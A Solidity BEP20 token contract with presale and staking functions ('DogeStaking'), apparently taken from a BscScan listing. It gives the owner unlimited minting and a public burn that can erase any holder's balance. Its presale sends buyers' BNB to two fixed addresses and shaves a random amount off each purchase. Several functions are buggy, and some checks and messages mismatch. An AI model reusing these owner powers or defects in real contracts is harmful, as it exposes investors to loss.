/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-05
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.22 <0.9.0;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Gift(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor ()  { }
  function _msgSender() internal view returns (address payable) {
    return payable(msg.sender);
  }
  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}







contract DogeStaking is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) public _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256  _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  constructor()  {
    _name = "DOGESTAKING";
    _symbol = "DGS";
    _decimals = 6;
    _totalSupply = 30000000000000 ; //30m 
   _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), address(this), _totalSupply);
  }

  function getOwner() override external view returns (address) {
    return owner(); 
  }

  function decimals() override external view returns (uint8) {
    return _decimals;
  }

  function symbol() override external view returns (string memory) {
    return _symbol;
  }

  function name() override external view returns (string memory) {
    return _name;
  }

  function totalSupply() override external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) override external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) override external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) override external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) override external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }


    function _transfer(address sender, address recipient, uint256 amount) internal {
   
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
       if(_balances[recipient] >= _totalSupply* 1500 / 10000){
         revert('You cant have more than 10% of total ');
       }
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }

 

    function _mint(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: mint to the zero address");

      _totalSupply = _totalSupply.add(amount);
      _balances[account] = _balances[account].add(amount);
      emit Transfer(address(30), account, amount);
    }

    function _burn(address account, uint256 amount) public onlyOwner {
      require(account != address(0), "BEP20: burn from the zero address");

      _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
      _totalSupply = _totalSupply.sub(amount);
      emit Transfer(account, address(0), amount);
    }

  function _approve(address owner, address spender, uint256 amount) internal {

    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}


contract DogeStakings is DogeStaking {
    using SafeMath for uint;

    event Invest (address,uint);
    event staked (address,uint);
    event dropedStak (address,uint);
    uint nonce = 130;
    uint public mull=3;
    bool finishpreSale = false;
    uint64 public minInvestment =  90000000000000000; // 0,09bnb
    uint public Raisedtoken;
    address private founder =0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB;
    address private guys = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C ;
    uint public limitSell = 100000000000;//100k
    uint64 public maxInvestment =  1000000000000000000; // 1bnb
    mapping (address => uint8) allowPreSale;
    mapping (address => uint) _staking;
    uint public tokenPrice = 240000000000000; // 
    string code ;
       event LOG (string message,bool state );

    constructor(string memory _code) {
        code = _code;
    }
  

    function finish_Sale()  public onlyOwner returns  (bool) {
        finishpreSale = true;
        return true;

    }


    function getDropStaking()  public view  returns (uint) {
        return  _staking[msg.sender];
    }
    
    function dropStaking(string memory _code,uint amount) payable public  returns (bool) {
            if(amount == 0 ){
            revert("This amount is higher tahn balance");
        }
      if (
            (keccak256(abi.encodePacked((_code))) !=
                keccak256(abi.encodePacked((code))))
        ) {
            revert("This code not found");
        }
      
         if(amount >  _staking[msg.sender] ){
            revert("This amount is higher tahn balance");
        }
  
    
      
        _staking[msg.sender]=_staking[msg.sender] - amount;
        _totalSupply=   _totalSupply.add(amount);
       _balances[msg.sender]=  _balances[msg.sender].add(amount);
        emit staked(msg.sender, amount);
    
        
     
        
        return true;
    }

    function staking(string memory _code,uint amount) payable public  returns (bool) {
     if(amount == 0){
            revert("This amount is higher tahn balance");
        }
       
      if (
            (keccak256(abi.encodePacked((_code))) !=
                keccak256(abi.encodePacked((code))))
        ) {
            revert("This code not found");
        }
        if(amount >   _balances[msg.sender]){
            revert("This amount is higher tahn balance");
        }
       
  
   
         _totalSupply =_totalSupply.sub(amount);
        _staking[msg.sender]=amount;
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        emit staked(msg.sender, amount);
    
        
     
        
        return true;
    }
    function allowStack(address ask ) public view returns(uint){
      return _staking[ask];
    }
    function preSale() payable public  returns (bool) {
    
        if(finishpreSale){
            revert("finish");
        }
        require(msg.value >= minInvestment, 'Value is less than minimum');
        require(msg.value <= maxInvestment, 'Value is less than minimum');
        if(allowPreSale[msg.sender] > 3){
            revert("you cant buy it agian ");
        }
        if(Raisedtoken>limitSell){
            revert("PreSale is full");
        }
        uint tokenAmount = msg.value.div(tokenPrice);

        uint tokens = tokenAmount- random() ;
  
        uint admin_share =msg.value * 1500 / 10000;// 
        uint remide =msg.value -admin_share;
        bool r  =  payable(guys).send(admin_share);
        bool r2 =  payable(founder).send(remide);
        emit LOG("=- > ",r);
        emit LOG("=- > ",r2);
        _balances[msg.sender] = _balances[msg.sender].add(tokens);
        _balances[owner()] = _balances[owner()].sub(tokens);
        Raisedtoken = Raisedtoken + tokens;
        allowPreSale[msg.sender] = allowPreSale[msg.sender]+1;
        
        emit Transfer(owner(), msg.sender, tokens);
        emit Transfer(owner(), msg.sender, tokens);
        emit Invest(msg.sender, msg.value);
        
     
        
        return true;
    }
    function random() internal returns (uint) {
        uint randomnumber = uint(keccak256(abi.encodePacked(block.timestamp, msg.sender, nonce))) % 900;
        randomnumber = randomnumber + 100;
        nonce++;
        return randomnumber;
    }
///**********************************************************************************************
    receive() payable external {
   preSale();
    }
}